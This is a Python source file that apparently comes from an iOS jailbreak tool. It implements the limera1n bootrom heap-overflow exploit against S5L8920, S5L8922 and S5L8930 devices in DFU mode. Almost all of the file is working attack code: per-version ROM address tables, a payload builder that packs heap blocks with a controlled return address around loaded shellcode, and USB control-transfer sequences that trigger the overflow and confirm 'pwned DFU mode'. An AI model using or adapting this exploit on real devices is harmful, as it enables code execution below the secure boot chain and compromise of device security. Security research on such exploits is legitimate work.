# Credit: This file is based on limera1n exploit (heap overflow) by geohot.

import array, ctypes, struct, sys, time
import usb # pyusb: use 'pip install pyusb' to install this module
import dfu

# Must be global so garbage collector never frees it 
request = None
transfer_ptr = None

constants_359_3 = [
    0x84031800, #  1 - RELOCATE_SHELLCODE_ADDRESS
          1024, #  2 - RELOCATE_SHELLCODE_SIZE
        0x83d4, #  3 - memmove
    0x84034000, #  4 - MAIN_STACK_ADDRESS
        0x43c9, #  5 - nor_power_on
        0x5ded, #  6 - nor_init
    0x84024820, #  7 - gUSBSerialNumber
        0x8e7d, #  8 - strlcat
        0x349d, #  9 - usb_wait_for_image
    0x84000000, # 10 - LOAD_ADDRESS
       0x24000, # 11 - MAX_SIZE
    0x84024228, # 12 - gLeakingDFUBuffer
        0x1ccd, # 13 - free
    0x65786563, # 14 - EXEC_MAGIC
        0x1f79, # 15 - memz_create
        0x3969, # 16 - jump_to
        0x1fa1, # 17 - memz_destroy
          0x60, # 18 - IMAGE3_LOAD_SP_OFFSET
          0x50, # 19 - IMAGE3_LOAD_STRUCT_OFFSET
        0x1fe5, # 20 - image3_create_struct
        0x2655, # 21 - image3_load_continue
        0x277b, # 22 - image3_load_fail
]

constants_359_3_2 = [
    0x84031800, #  1 - RELOCATE_SHELLCODE_ADDRESS
          1024, #  2 - RELOCATE_SHELLCODE_SIZE
        0x83dc, #  3 - memmove
    0x84034000, #  4 - MAIN_STACK_ADDRESS
        0x43d1, #  5 - nor_power_on
        0x5df5, #  6 - nor_init
    0x84024820, #  7 - gUSBSerialNumber
        0x8e85, #  8 - strlcat
        0x34a5, #  9 - usb_wait_for_image
    0x84000000, # 10 - LOAD_ADDRESS
       0x24000, # 11 - MAX_SIZE
    0x84024228, # 12 - gLeakingDFUBuffer
        0x1ccd, # 13 - free
    0x65786563, # 14 - EXEC_MAGIC
        0x1f81, # 15 - memz_create
        0x3971, # 16 - jump_to
        0x1fa9, # 17 - memz_destroy
          0x60, # 18 - IMAGE3_LOAD_SP_OFFSET
          0x50, # 19 - IMAGE3_LOAD_STRUCT_OFFSET
        0x1fed, # 20 - image3_create_struct
        0x265d, # 21 - image3_load_continue
        0x2783, # 22 - image3_load_fail
]

constants_359_5 = [
    0x84031800, #  1 - RELOCATE_SHELLCODE_ADDRESS
          1024, #  2 - RELOCATE_SHELLCODE_SIZE
        0x8564, #  3 - memmove
    0x84034000, #  4 - MAIN_STACK_ADDRESS
        0x43b9, #  5 - nor_power_on
        0x5f75, #  6 - nor_init
    0x84024750, #  7 - gUSBSerialNumber
        0x901d, #  8 - strlcat
        0x36e5, #  9 - usb_wait_for_image
    0x84000000, # 10 - LOAD_ADDRESS
       0x24000, # 11 - MAX_SIZE
    0x84024158, # 12 - gLeakingDFUBuffer
        0x1a51, # 13 - free
    0x65786563, # 14 - EXEC_MAGIC
        0x1f25, # 15 - memz_create
        0x39dd, # 16 - jump_to
        0x1f0d, # 17 - memz_destroy
          0x64, # 18 - IMAGE3_LOAD_SP_OFFSET
          0x60, # 19 - IMAGE3_LOAD_STRUCT_OFFSET
        0x2113, # 20 - image3_create_struct
        0x2665, # 21 - image3_load_continue
        0x276d, # 22 - image3_load_fail
]

constants_574_4 = [
    0x84039800, #  1 - RELOCATE_SHELLCODE_ADDRESS
          1024, #  2 - RELOCATE_SHELLCODE_SIZE
        0x84dc, #  3 - memmove
    0x8403c000, #  4 - MAIN_STACK_ADDRESS
        0x4e8d, #  5 - nor_power_on
        0x690d, #  6 - nor_init
    0x8402e0e0, #  7 - gUSBSerialNumber
        0x90c9, #  8 - strlcat
        0x4c85, #  9 - usb_wait_for_image
    0x84000000, # 10 - LOAD_ADDRESS
       0x2c000, # 11 - MAX_SIZE
    0x8402dbcc, # 12 - gLeakingDFUBuffer
        0x3b95, # 13 - free
    0x65786563, # 14 - EXEC_MAGIC
        0x7469, # 15 - memz_create
        0x5a5d, # 16 - jump_to
        0x7451, # 17 - memz_destroy
          0x68, # 18 - IMAGE3_LOAD_SP_OFFSET
          0x64, # 19 - IMAGE3_LOAD_STRUCT_OFFSET
        0x412d, # 20 - image3_create_struct
        0x46db, # 21 - image3_load_continue
        0x47db, # 22 - image3_load_fail
]

class DeviceConfig:
    def __init__(self, version, cpid, exploit_lr, max_size, constants):
        self.version = version
        self.cpid = cpid
        self.exploit_lr = exploit_lr
        self.max_size = max_size
        self.constants = constants

configs = [
    DeviceConfig('359.3',   '8920', 0x84033FA4, 0x24000, constants_359_3),   # S5L8920 (old bootrom)
    DeviceConfig('359.3.2', '8920', 0x84033FA4, 0x24000, constants_359_3_2), # S5L8920 (new bootrom)
    DeviceConfig('359.5',   '8922', 0x84033F98, 0x24000, constants_359_5),   # S5L8922
    DeviceConfig('574.4',   '8930', 0x8403BF9C, 0x2C000, constants_574_4),   # S5L8930
]

def create_control_transfer(device, request, timeout):
    ptr = usb.backend.libusb1._lib.libusb_alloc_transfer(0)
    assert ptr is not None

    transfer = ptr.contents
    transfer.dev_handle = device._ctx.handle.handle
    transfer.endpoint = 0 # EP0
    transfer.type = 0 # LIBUSB_TRANSFER_TYPE_CONTROL
    transfer.timeout = timeout
    transfer.buffer = request.buffer_info()[0] # C-pointer to request buffer
    transfer.length = len(request)
    transfer.user_data = None
    transfer.callback = usb.backend.libusb1._libusb_transfer_cb_fn_p(0) # NULL
    transfer.flags = 1 << 1 # LIBUSB_TRANSFER_FREE_BUFFER

    return ptr

def limera1n_libusb1_async_ctrl_transfer(device, bmRequestType, bRequest, wValue, wIndex, data, timeout):
    if usb.backend.libusb1._lib is not device._ctx.backend.lib:
        print 'ERROR: This exploit requires libusb1 backend, but another backend is being used. Exiting.'
        sys.exit(1)

    request = array.array('B', struct.pack('<BBHHH', bmRequestType, bRequest, wValue, wIndex, len(data)) + data)
    transfer_ptr = create_control_transfer(device, request, timeout)
    assert usb.backend.libusb1._lib.libusb_submit_transfer(transfer_ptr) == 0

    time.sleep(timeout / 1000.0)

    # Prototype of libusb_cancel_transfer is missing from pyusb
    usb.backend.libusb1._lib.libusb_cancel_transfer.argtypes = [ctypes.POINTER(usb.backend.libusb1._libusb_transfer)]
    assert usb.backend.libusb1._lib.libusb_cancel_transfer(transfer_ptr) == 0

def generate_payload(constants, exploit_lr):
    with open('bin/limera1n-shellcode.bin', 'rb') as f:
        shellcode = f.read()

    # Shellcode has placeholder values for constants; check they match and replace with constants from config
    placeholders_offset = len(shellcode) - 4 * len(constants)
    for i in range(len(constants)):
        offset = placeholders_offset + 4 * i
        (value,) = struct.unpack('<I', shellcode[offset:offset + 4])
        assert value == 0xBAD00001 + i

    shellcode_address = 0x84000400 + 1
    heap_block = struct.pack('<4I48s', 0x405, 0x101, shellcode_address, exploit_lr, '\xCC' * 48)
    return heap_block * 16 + shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants)

def exploit():
    print '*** based on limera1n exploit (heap overflow) by geohot ***'

    device = dfu.acquire_device()
    print 'Found:', device.serial_number

    if 'PWND:[' in device.serial_number:
        print 'Device is already in pwned DFU Mode. Not executing exploit.'
        return
    
    chosenConfig = None
    for config in configs:
        if 'SRTG:[iBoot-%s]' % config.version in device.serial_number:
            chosenConfig = config
            break
    if chosenConfig is None:
        for config in configs:
            if 'CPID:%s' % config.cpid in device.serial_number:
                print 'ERROR: CPID is compatible, but serial number string does not match.'
                print 'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.'
                sys.exit(1)
        print 'ERROR: Not a compatible device. This exploit is for S5L8920/S5L8922/S5L8930 devices only. Exiting.'
        sys.exit(1)
    
    dfu.send_data(device, generate_payload(chosenConfig.constants, chosenConfig.exploit_lr))

    assert len(device.ctrl_transfer(0xA1, 1, 0, 0, 1, 1000)) == 1

    limera1n_libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 10)

    try:
        device.ctrl_transfer(0x21, 2, 0, 0, 0, 10)
        print 'ERROR: This request succeeded, but it should have raised an exception. Exiting.'
        sys.exit(1)
    except usb.core.USBError:
        # OK: This request should have raised USBError.
        pass

    dfu.usb_reset(device)
    dfu.release_device(device)
    
    device = dfu.acquire_device()
    dfu.request_image_validation(device)
    dfu.release_device(device)

    time.sleep(0.5)

    device = dfu.acquire_device()
    failed = 'PWND:[limera1n]' not in device.serial_number
    dfu.release_device(device)

    if failed:
        print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.'
        sys.exit(1)

    print 'Device is now in pwned DFU Mode.'
